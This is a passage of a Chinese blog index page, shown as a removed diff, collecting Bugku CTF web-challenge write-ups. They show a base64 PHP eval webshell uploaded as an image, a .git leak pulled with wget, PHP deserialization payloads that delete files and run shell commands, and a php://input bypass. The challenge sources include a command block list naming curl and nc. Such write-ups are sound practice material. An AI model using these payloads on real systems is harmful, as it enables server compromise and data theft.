-          <a class="article-more-a" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-xxx二手交易市场" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/">bugku-web-xxx二手交易市场</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/" class="archive-article-date">
-  	<time datetime="2021-08-12T05:44:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>先注册一个账号，发现有个可以传图片的地方</p>
-<img src="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/1.PNG" class="" title="1.PNG">
-
-<p>试着传一个图片吧，发现图片被base64加密后上传<br>所以自己做一个base64加密后的木马：<code>data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</code></p>
-<img src="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/2.PNG" class="" title="2.PNG">
-<p>上蚁剑</p>
-<img src="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-source" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-source/">bugku-web-source</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-source/" class="archive-article-date">
-  	<time datetime="2021-08-12T05:19:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>查看源代码，发现一个flag</p>
-<img src="/2021/08/12/bugku-web-source/1.PNG" class="" title="1.PNG">
-
-<p>base64解码解不出东西，所以是个假flag</p>
-<img src="/2021/08/12/bugku-web-source/2.PNG" class="" title="2.PNG">
-
-<p>扫目录扫出一大堆东西</p>
-<img src="/2021/08/12/bugku-web-source/3.PNG" class="" title="3.PNG">
-
-<p>git泄露，打开kali，将git文件下载，<code>wget -r http://114.67.246.176:12392/.git</code><br>在文件夹下打开，<code>git reflog    //查看执行的命令日志</code></p>
-<img src="/2021/08/12/bugku-web-source/4.PNG" class="" title="4.PNG">
-
-<p>一个一个show直到找到正确的flag：<code>git show e0b8e8e</code></p>
-<img src="/2021/08/12/bugku-web-source/5.PNG" class="" title="5.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-source/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-noteasytrick" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-noteasytrick/">bugku-web-noteasytrick</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-noteasytrick/" class="archive-article-date">
-  	<time datetime="2021-08-12T04:08:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53460654/article/details/116798346">https://blog.csdn.net/qq_53460654/article/details/116798346</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&quot;display_errors&quot;,&quot;Off&quot;);</span><br><span class="line">class Jesen &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line">    public $me;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;me &#x3D; new Ctf();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;me-&gt;open($this-&gt;filename,$this-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ctf &#123;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return &quot;die&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function open($filename, $content)&#123;</span><br><span class="line">        if(!file_get_contents(&quot;.&#x2F;sandbox&#x2F;lock.lock&quot;))&#123;</span><br><span class="line">            echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</span><br><span class="line">            die();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            file_put_contents(&quot;.&#x2F;sandbox&#x2F;&quot;.md5($filename.time()),$content);</span><br><span class="line">            die(&quot;or you can guess the final filename?&quot;); </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&#39;a&#39;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(($_POST[&#39;b&#39;] !&#x3D; $_POST[&#39;a&#39;]) &amp;&amp; (md5($_POST[&#39;b&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;a&#39;])))&#123;</span><br><span class="line">        unserialize($_POST[&#39;c&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先是一个md5碰撞，因为要利用b来传值，所以只能用碰撞</p>
-<p>为了绕过wakeup，还需要改元素数量使其不匹配</p>
-<p>因为<code>./sandbox/lock.lock</code>这个文件存在，而我们需要利用<code>echo file_get_contents(substr($_POST[&#39;b&#39;],0,30));</code>，所以必须把这个文件删掉</p>
-<p>这里利用ZipArchive 内置类的open方法达到删除文件效果</p>
-<p>令$filename = ‘./sandbox/lock.lock’;$content = 8;<br>（8应该是因为context的第八个是Zip context options，参考：<code>https://www.php.net/manual/zh/context.php</code>)<br>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Jesen &#123;</span><br><span class="line"></span><br><span class="line">    public $filename &#x3D; &#39;.&#x2F;sandbox&#x2F;lock.lock&#39;;</span><br><span class="line">    public $content &#x3D; 8;</span><br><span class="line">    public $me;&#125;</span><br><span class="line">$a &#x3D; new  Jesen();</span><br><span class="line">$zip  &#x3D; new  ZipArchive;</span><br><span class="line">$a-&gt;me &#x3D; $zip;</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">$b &#x3D; str_replace(&#39;&quot;:3:&#39;,&#39;&quot;:4:&#39;,$b);</span><br><span class="line">echo $b;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
-<p>先上传```a[]=1&amp;b[]=2&amp;c=O:5:”Jesen”:4:{s:8:”filename”;s:19:”./sandbox/lock.lock”;s:7:”content”;i:8;s:2:”me”;O:10:”ZipArchive”:5:{s:6:”status”;i:0;s:9:”statusSys”;i:0;s:8:”numFiles”;i:0;s:8:”filename”;s:0:””;s:7:”comment”;s:0:””;}}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">然后就是md5碰撞，因为要过滤掉b的前30个字节，所以可以传&#96;&#96;&#96;.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
-<p>不过这样就不能找现成的碰撞了，多亏大佬给了一个很方便的工具——fastcoll：<a target="_blank" rel="noopener" href="https://www.zeroplace.cn/article.asp?id=886">https://www.zeroplace.cn/article.asp?id=886</a><br>不过不建议在那个网站安装，建议在官网<a target="_blank" rel="noopener" href="https://www.win.tue.nl/hashclash/">https://www.win.tue.nl/hashclash/</a></p>
-<p>得到1 _msg1.txt和1 _msg2.txt文件</p>
-<img src="/2021/08/12/bugku-web-noteasytrick/1.PNG" class="" title="1.PNG">
-
-<p>url编码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function readmyfile($path)&#123;</span><br><span class="line">    $fh&#x3D;fopen($path,&quot;rb&quot;);</span><br><span class="line">    $data&#x3D;fread($fh,filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return$data;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;echo md5( (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">&#x2F;&#x2F;echo &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;;</span><br><span class="line">echo urlencode(readmyfile(&quot;1.txt&quot;));</span><br><span class="line">&#x2F;&#x2F;echo md5( (readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#39;;</span><br><span class="line">echo urlencode(readmyfile(&quot;2.txt&quot;));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>构建一个凑数用的c：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Jesen&#123;</span><br><span class="line">    public$filename;</span><br><span class="line">    public$content;</span><br><span class="line">    public$me;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Jesen();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>最终payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/08/12/bugku-web-noteasytrick/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-noteasytrick/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-安慰奖" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">bugku-web-安慰奖</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/" class="archive-article-date">
-  	<time datetime="2021-08-12T03:46:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>查看源代码，发现一个base64，解码后发现backups，没看懂是什么意思</p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/1.PNG" class="" title="1.PNG">
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/2.PNG" class="" title="2.PNG">
-<p>扫目录发现备份文件才明白那个backup大概是提示的这个</p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/3.PNG" class="" title="3.PNG">
-
-<p>文件打开后是php源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!-- YmFja3Vwcw&#x3D;&#x3D; --&gt;&quot;;</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">    protected $username &#x3D; &#39;hack&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;NULL&#39;;</span><br><span class="line">    public function __construct($username,$cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;cmd &#x3D; $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;&#x2F;cat|more|tail|less|head|curl|nc|strings|sort|echo&#x2F;i&quot;, $this-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            exit(&#39;&lt;&#x2F;br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">           &#x2F;&#x2F; echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span><br><span class="line">            $a &#x3D; &#96;$this-&gt;cmd&#96;;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;给你个安慰奖吧，hhh！&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>反序化题，没有过滤tac和ls</p>
-<p>payload(因为这道题涉及protected，所以反序化后会有空字符，必须用url编码）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctf</span><br><span class="line">&#123;</span><br><span class="line">	protected $username &#x3D; &#39;admin&#39;;</span><br><span class="line">    protected $cmd &#x3D; &#39;[shell]&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new ctf;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
-
-<p>还需要绕过wakeup（不然就会变成guest），当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行，所以还需要把2改成3。</p>
-<p>最终payload：<br>ls：<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A2%3A%22ls%22%3B%7D</code></p>
-<p>tac flag.php:<code>?code=O%3A3%3A%22ctf%22%3A3%3A%7Bs%3A11%3A%22%00%2A%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A12%3A%22tac+flag.php%22%3B%7D</code></p>
-<img src="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/4.PNG" class="" title="4.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-%E5%AE%89%E6%85%B0%E5%A5%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-file-get-contents" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/bugku-web-file-get-contents/">bugku-web-file_get_contents</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/12/bugku-web-file-get-contents/" class="archive-article-date">
-  	<time datetime="2021-08-12T03:39:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f &#x3D; trim(file_get_contents($fn));</span><br><span class="line">if ($ac &#x3D;&#x3D;&#x3D; $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>file_get_contents</code>是把文件读取成字符串</p>
-<p>所以用<code>php://input</code></p>
-<p>传入<code>?fn=php://input&amp;ac=1</code><br>然后post传入<code>1</code><br>得到flag</p>
-<img src="/2021/08/12/bugku-web-file-get-contents/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-file-get-contents/">展开全文 >></a>
         </p>
       
 
